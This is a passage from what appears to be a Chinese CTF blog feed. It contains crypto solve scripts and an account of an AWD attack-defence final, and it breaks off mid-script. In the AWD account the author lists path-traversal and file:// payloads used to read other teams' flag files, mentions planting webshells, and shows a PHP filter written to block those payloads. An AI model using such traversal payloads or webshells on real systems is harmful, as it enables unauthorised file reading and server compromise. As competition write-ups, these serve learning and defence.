0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 0, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="move"><a href="#move" class="headerlink" title="move"></a>move</h4><p>根据题目有 $ex-yn=y(p+q+1)-z$，且发现 $e$ 和 $N$ 比较小那么就可以造格子进行格基规约,这样就能求出 $x$ 和 $y=ex//n$ 那么余数<br>$$<br>\begin{aligned}<br>k&amp;=y(p+q+1)-z\\<br>&amp;=ex-ynk \\<br>&amp;= y(p+q+1)-z \\<br>&amp;= y(p+q+1) - zbound - ((p + 1)(q + 1)y - zbound)\mod x \\<br>&amp;= y(p+q+1) + int(\frac{((p-q)y\cdot round(n^{0.25}))}{(3(p + q))}) - ((p + 1)(q + 1)y - zbound)\mod x \\<br>&amp;=y((p+q+1) + \frac{(p-q)\cdot round(n^{0.25}))}{(3(p + q))}<br>\end{aligned}<br>$$<br>所以 $k$ 整除 $y$ ，这里我们设 $K=\frac{k}{y}=\frac{(p+q+1) + ((p-q)\cdot round(n^{0.25}))}{(3*(p + q))}$ 我们设 $s=p+q$ ，则 $p-q=\frac{3s(K-1-s)}{round(n^{0.25})}$ ，根据 $(p+q)^2-(p-q)^2=4n$ ，二分即可找到 $s$ ，接着算出 $d$ ，在ECC上进行标量乘法即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">p1, p2</span>):</span></span><br><span class="line">    <span class="keyword">if</span> p1 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p2</span><br><span class="line">    <span class="keyword">if</span> p2 == (<span class="number">0</span>, <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> p1</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>] <span class="keyword">and</span> (p1[<span class="number">1</span>] != p2[<span class="number">1</span>] <span class="keyword">or</span> p1[<span class="number">1</span>] == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> p1[<span class="number">0</span>] == p2[<span class="number">0</span>]:</span><br><span class="line">        tmp = (<span class="number">3</span> * p1[<span class="number">0</span>] * p1[<span class="number">0</span>]) * inverse(<span class="number">2</span> * p1[<span class="number">1</span>], n) % n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = (p2[<span class="number">1</span>] - p1[<span class="number">1</span>]) * inverse(p2[<span class="number">0</span>] - p1[<span class="number">0</span>], n) % n</span><br><span class="line">    x = (tmp * tmp - p1[<span class="number">0</span>] - p2[<span class="number">0</span>]) % n</span><br><span class="line">    y = (tmp * (p1[<span class="number">0</span>] - x) - p1[<span class="number">1</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> (int(x), int(y))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span>(<span class="params">n, p</span>):</span></span><br><span class="line">    r = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    tmp = p</span><br><span class="line">    <span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">        <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">            r = add(r, tmp)</span><br><span class="line">        n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp, tmp)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">M = Matrix(ZZ,[[<span class="number">2</span>**<span class="number">512</span>,e],[<span class="number">0</span>,-n]])</span><br><span class="line">A = M.LLL()[<span class="number">0</span>]</span><br><span class="line">x = A[<span class="number">0</span>]&gt;&gt;<span class="number">512</span></span><br><span class="line">print((e*x-A[<span class="number">1</span>])//n)</span><br><span class="line">e = <span class="number">67595664083683668964629173652731210158790440033379175857028564313854014366016864587830963691802591775486321717360190604997584315420339351524880699113147436604350832401671422613906522464334532396034178284918058690365507263856479304019153987101884697932619200538492228093521576834081916538860988787322736613809</span></span><br><span class="line">n = <span class="number">80263253261445006152401958351371889864136455346002795891511487600252909606767728751977033280031100015044527491214958035106007038983560835618126173948587479951247946411421106848023637323702085026892674032294882180449860010755423988302942811352582243198025232225481839705626921264432951916313817802968185697281</span></span><br><span class="line">y = <span class="number">-22131877391133483964429946329193825460775374851078084751208971056041193500203</span></span><br><span class="line">c = (<span class="number">6785035174838834841914183175930647480879288136014127270387869708755060512201304812721289604897359441373759673837533885681257952731178067761309151636485456082277426056629351492198510336245951408977207910307892423796711701271285060489337800033465030600312615976587155922834617686938658973507383512257481837605</span>, <span class="number">38233052047321946362283579951524857528047793820071079629483638995357740390030253046483152584725740787856777849310333417930989050087087487329435299064039690255526263003473139694460808679743076963542716855777569123353687450350073011620347635639646034793626760244748027610309830233139635078417444771674354527028</span>)</span><br><span class="line">x = <span class="number">-26279444166664821795077701675621823220865336004430428203703688888211697122228</span></span><br><span class="line">k = e*x-y*n</span><br><span class="line">K = k//y</span><br><span class="line">print(k)</span><br><span class="line">print(K)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factor</span>(<span class="params">K,N</span>):</span></span><br><span class="line">    l = <span class="number">0</span></span><br><span class="line">    r = K</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">518</span>):</span><br><span class="line">        s = (l+r)//<span class="number">2</span></span><br><span class="line">        v = s*s - (<span class="number">9</span>*s*s*(K<span class="number">-1</span>-s)*(K<span class="number">-1</span>-s)//(round(N**<span class="number">0.25</span>)*round(N**<span class="number">0.25</span>)))</span><br><span class="line">        <span class="keyword">if</span> v &lt; <span class="number">4</span>*N:</span><br><span class="line">            l = s</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            r = s</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line">factor(K,n)</span><br><span class="line"></span><br><span class="line">S = <span class="number">18383013852155207284866834850624501649134164688503883162216824258842790032992437383933186349369945088653252318167911285710266631681220716855493349532603970</span></span><br><span class="line">d = inverse(e,n+<span class="number">1</span>+S)</span><br><span class="line">print(d)</span><br><span class="line">m = mul(d,c)</span><br><span class="line">flag = long_to_bytes(m[<span class="number">0</span>]) + long_to_bytes(m[<span class="number">1</span>])</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h3><h4 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h4><p>追踪TCP流找到坐标，画图即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">&quot;data.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line">ff = re.compile(<span class="string">r&#x27;Value.\[(.*?)\]&#x27;</span>)</span><br><span class="line">res = ff.findall(data)</span><br><span class="line">print(res)</span><br><span class="line"></span><br><span class="line">x_list = []</span><br><span class="line">y_list = []</span><br><span class="line">z_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    i = i.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    x,y,z = int(i[<span class="number">0</span>]),int(i[<span class="number">1</span>]),int(i[<span class="number">2</span>])</span><br><span class="line">    x_list.append(x)</span><br><span class="line">    y_list.append(-y)</span><br><span class="line">    z_list.append(z)</span><br><span class="line"></span><br><span class="line">print(x_list)</span><br><span class="line">print(y_list)</span><br><span class="line">print(z_list)</span><br><span class="line"></span><br><span class="line">plt.plot(x_list,y_list,<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;CISCN&#123;&quot;</span>+md5(<span class="string">b&quot;easy_robo_xx&quot;</span>).hexdigest()+<span class="string">&quot;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="华东北半决赛"><a href="#华东北半决赛" class="headerlink" title="华东北半决赛"></a>华东北半决赛</h2><p>攻防科技大学主办的，半决赛就发衣服，80个队的awd体验还不错（？</p><h3 id="冥场面"><a href="#冥场面" class="headerlink" title="冥场面"></a>冥场面</h3><p><img src="https://ftp.bmp.ovh/imgs/2021/06/ff365a6892aea9b8.png" alt="冥场面"></p><p>虽然自己被打傻了，不过自己也打了个爽，全程看流量打人/修站（雾</p><h4 id="cafecms"><a href="#cafecms" class="headerlink" title="cafecms"></a>cafecms</h4><p>构造了这么几种payload</p><blockquote><p>/wap/Common/show?templateFile=../../../../../../../flag<br>/wap/Common/show?templateFile=/flag<br>/wap/Common/show?templateFile=file:////flag</p></blockquote><p>去找了一下调用的函数位置，检查一下templateFile如果有flag直接改空就防住了</p><p>D盾还扫出来个eval后门，只不过不会用也不会修，后来被打的连妈都不认识了w</p><h4 id="eyou"><a href="#eyou" class="headerlink" title="eyou"></a>eyou</h4><p>刚开始没看这题，连上之后发现MySQL库被人删了，再后来直接被get shell了，又是一个被打的连妈都不认识的站w</p><p>在之后重启了一波，结果<code>admin.php</code>给人写了rce，flag直接被挂首页w</p><h4 id="cryptopark"><a href="#cryptopark" class="headerlink" title="cryptopark"></a>cryptopark</h4><p>awd里居然看见了密码题？拖进IDA看了两眼发现有好几个密码题，而且只要小小伪造一下就能<code>\bin\sh</code>了，然后光速写了几个密码exp接着打全场<del>（嘻嘻）</del>，后来师傅们也从堆用pwn的方法get shell了，接着拿去批量跑</p><h4 id="lol"><a href="#lol" class="headerlink" title="lol"></a>lol</h4><p>又是个任意读，不过这次我手速快，光速写exp打了一波全场 <del>（嘻嘻）</del><br>大概这么几种姿势</p><blockquote><p>/statics/1.php?file=file:///flag<br>/statics/1.php?file=/flag<br>/statics/1.php?file=../../../../../../../flag</p></blockquote><p>修好之后发现还有人打，抓了一下流量看到这个payload</p><blockquote><p>/index.php?g=Admin&amp;m=Public&amp;a=display&amp;templateFile=../../../../../../../../../../../../../../flag</p></blockquote><p>web小白根本看不太懂PHP，更别说代码审计了wAw，于是就现场看着PHP手册和原先写好的PHP源码现场极限学习</p><p>先看<code>index.php</code>有这么段读参数的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;m&quot;</span>) <span class="keyword">as</span> $v) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[$v])) &#123;</span><br><span class="line">        $_GET[$v] = ucwords($_GET[$v]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那既然这段payload要过index.php，而所传的变量名又已知，为了短期防御，那么就可以在这个地方把所有的变量都读进来，然后处理掉就行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;templateFile&quot;</span>) <span class="keyword">as</span> $v) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[$v])) &#123;</span><br><span class="line">        <span class="keyword">if</span>($v == <span class="string">&quot;templateFile&quot;</span> &amp;&amp; (</span><br><span class="line">        ($_GET[$v][<span class="number">0</span>] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; $_GET[$v][<span class="number">1</span>] == <span class="string">&#x27;.&#x27;</span>) ||</span><br><span class="line">        ($_GET[$v][<span class="number">0</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; $_GET[$v][<span class="number">1</span>] == <span class="string">&#x27;f&#x27;</span>) ||</span><br><span class="line">        ($_GET[$v][<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span> &amp;&amp; $_GET[$v][<span class="number">1</span>] == <span class="string">&#x27;i&#x27;</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $_GET[$v] = ucwords($_GET[$v]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修好之后接着拿这几个payload去打别人了（</p><blockquote><p>/index.php?g=Admin&amp;m=Public&amp;a=display&amp;templateFile=../../../../../../../../../../../../../../flag<br>/index.php?g=Admin&amp;m=Public&amp;a=display&amp;templateFile=/flag<br>/index.php?g=Admin&amp;m=Public&amp;a=display&amp;templateFile=file://///flag</p></blockquote><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>打到后面后台脚本把内存跑到16G，加上OBS和一堆乱七八糟的玩意中间炸过一次内存w，到最后的时候被打成筛子就只能检查自己的批量脚本有没有正常工作了，7个while 1的脚本同时跑着10+的payload，还有五六个打奇奇怪怪的混淆流量的脚本 （雾</p><p>各位师傅们的混淆也是tmd千奇百怪，我以为我防出去了啊，结果师傅们不讲武德，给我种🐎，打开流量我定睛一看，在一堆<code>fmyy i love you</code>、<code>xxxx yyds</code>还有奇奇怪怪的歌词里面，写的竟然全是<code>.shell.php</code>！（雾</p><p>既然我们有🐎，那别人肯定也有，然后搭了几趟顺风车，不过web小白啥也不会，别人稍微藏起来之后就尬住了w</p><p>结果rk20<br><img src="https://ftp.bmp.ovh/imgs/2021/06/066f70ace15336c0.png" alt="res"></p><p>唉，还是太菜了，第一年也只能止步于此了（</p><h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><del>u1s1，平时都凭本事打进了W&amp;M，结果校赛被分到3队有、不开心</del></p><p>初赛高考没啥好说的，crypto打了2k+的分把2队按在地上锤（雾</p><p>怎么说呢，第一次打awd的萌新算是打了个爽，线下前一天晚上还在和<code>h3zh1</code>师傅学习怎么打awd，在现场用<code>ha1c9on</code>师傅教过的一点web加被迫极限学习边打边修，可能从此就转路web了（？</p><p><del>我也要在别人机子上种🐎！我也要get shell！（逃</del></p><p>感谢师傅们对我这个fw的栽培和帮助，qaq明年继续加油吧</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;祭第一次国赛-第一次AWD&quot;&gt;&lt;a href=&quot;#祭第一次国赛-第一次AWD&quot; class=&quot;headerlink&quot; title=&quot;祭第一次国赛/第一次AWD&quot;&gt;&lt;/a&gt;祭第一次国赛/第一次AWD&lt;/h1&gt;&lt;p&gt;华东北太卷啦太卷啦&lt;/p&gt;
&lt;h2 id=&quot;线上初赛</summary>
      
    
    
    
    <category term="AWD" scheme="http://example.com/categories/AWD/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="AWD" scheme="http://example.com/tags/AWD/"/>
    
    <category term="Crypto" scheme="http://example.com/tags/Crypto/"/>
    
    <category term="Misc" scheme="http://example.com/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>Writeup for MRCTF2021 crypto</title>
    <link href="http://example.com/2021/04/16/Wp_for_mrctf2021/"/>
    <id>http://example.com/2021/04/16/Wp_for_mrctf2021/</id>
    <published>2021-04-16T11:58:26.000Z</published>
    <updated>2021-04-25T12:07:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Writeup-for-MRCTF2021-39-s-crypto"><a href="#Writeup-for-MRCTF2021-39-s-crypto" class="headerlink" title="Writeup for MRCTF2021&#39;s crypto"></a>Writeup for MRCTF2021&#39;s crypto</h1><p>比赛前打了疫苗，困得要命，然后神志不清的写了一堆shi，虽然比赛的时候心态炸了，但高质量的题目该复现还得复现</p><h2 id="friendly-sign-in"><a href="#friendly-sign-in" class="headerlink" title="friendly_sign-in"></a>friendly_sign-in</h2><p>签到题，定义了一个函数，要求提供使得 $f(x_{list})=0$ 的<code>x-list</code>，回答一次给一位 $flag$ ，但之后的不能和之前的重复</p><p>直接系数两两交换，其中一个取相反数，然后为了前后不重复再乘一个系数即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&quot;node.mrctf.fun&quot;</span>, <span class="string">&quot;10007&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">passpow</span>():</span></span><br><span class="line">    rev = r.recvuntil(<span class="string">&quot;POW: SHA512(&quot;</span>)</span><br><span class="line">    r.recv(<span class="number">1</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">8</span>).decode()</span><br><span class="line">    print(suffix)</span><br><span class="line">    r.recvline()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x</span>):</span></span><br><span class="line">        hashresult = hashlib.sha512((suffix+x).encode()).hexdigest()</span><br><span class="line">        <span class="keyword">if</span> hashresult.startswith(<span class="string">&quot;11111&quot;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    prefix = util.iters.mbruteforce(f,table,<span class="number">4</span>,<span class="string">&#x27;upto&#x27;</span>)</span><br><span class="line">    r.sendline(str(prefix))</span><br><span class="line"></span><br><span class="line">passpow()</span><br><span class="line">r.recvline()</span><br><span class="line">r.recvuntil(<span class="string">&quot;N = &quot;</span>)</span><br><span class="line">data = r.recvline(<span class="literal">False</span>).strip().decode()[<span class="number">1</span>:<span class="number">-1</span>]</span><br><span class="line">data = data.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">N = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    N.append(int(i))</span><br><span class="line"><span class="comment"># print(len(N))</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(len(N)<span class="number">-1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(N),<span class="number">2</span>):</span><br><span class="line">        r.sendline(str(-(j+<span class="number">1</span>)*N[i+<span class="number">1</span>]))</span><br><span class="line">        r.sendline(str((j+<span class="number">1</span>)*N[i]))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;your gift:&quot;</span>)</span><br><span class="line">    ans = r.recvline(<span class="literal">False</span>).strip().decode()</span><br><span class="line">    flag += ans</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(int(flag,<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># r.interactive()</span></span><br></pre></td></tr></table></figure><h2 id="nomore"><a href="#nomore" class="headerlink" title="nomore"></a>nomore</h2><p>小模数RSA，其中 $e\in (9000,10000)$ ， $p,q\in (1000000, 3000000)$ ，给了 $A=(((y%x)^7)%(x%y))^7+y^5+(y+1)/x$ ，一个条件 $secret=e^3+p^3+q^3=(x+y)%7754486886526049041+210729175671163973$ 和 $x$ 的上界</p><p>感觉是为了出题而出题，条件给的好僵硬（</p><p>因为这里是 $(y+1)/x$ 整除，所以得到 $y+1=k\cdot x$ （这样出题这里好没有说服力啊= =），所以 $y=k\cdot x-1$ ，带入A中化简一下可得 $A=(x-1)^7+(kx-1)^5+k$ ，显然这个玩意是递增的，而且给了 $x$ 的上界，这里可以用二分法得到 $x$ 的值，随后得到 $secret$ ，接着爆破得到 $e,p,q$</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">693282726315</span></span><br><span class="line">A = <span class="number">2235930885430590738951770802593215586722001521194365487273377655750584443688709547709496531484159367793509666612116139038917661713102981488722293426038029073850795986080412124312908732573382156365974821471629333126275130148211145598662897276781331183691743094904957217401055325352877284530068805608962270139656431076370452327497416723045785664344412694060886085511378779487559306015113302658964110922621164879307182468690182325142055960562810349297544601157473985262796723316777380726315782859115449976700612343978057140270903396910431420116573138154719798955123904805279320166126412714788508008881174164656203605409187705643395043643983135944514470267283183175620492198093264226038082725867230101096344723124629565311122528005863046865164876192248803940590219355154176343702897505891392317123983475290611327887699795851456183931854177169939743970260837586185988111368384484356413787993370384262996486824251003884057486063787194241555190688935624792041028246639984544749568167915235629185515957106136630401960066317998226671344793061752525215496195839080165952892472180997564802474095868944184005854120238623750555477937802107959321257495435617363809377093354132077991399603767147974592666019334636208414969819333321639542282741932229892501074615920120228860717401055433206357806353717291748096464569063777964784860874773660469621546777686833078007220613545223169043960754010332944526795605043595879174073360317477199909570141202125189377475655277483919081658123820105695508771837612756891055031293872293977244105248233915807603916034288916844336329883443200123825714530812637709561686224468031953278836676202928878535091578725509651544544672494980806630321114490828976895602038151224026672265830787863940762596976124958000977955469148027648603199590311852993367450800166591526272653355552342455506908317529193196174849749103073968182002498580115241030154502931088245539152380579199202750010140022979979488971008874424439325749039212427088023136971891092490697689178097172878439007028844083681030357488034860471042630885195387680286557424780235116405464735985082715745087677866688657626763753940919966662710093619034074861812080778855241391731006</span></span><br><span class="line"></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    upper = <span 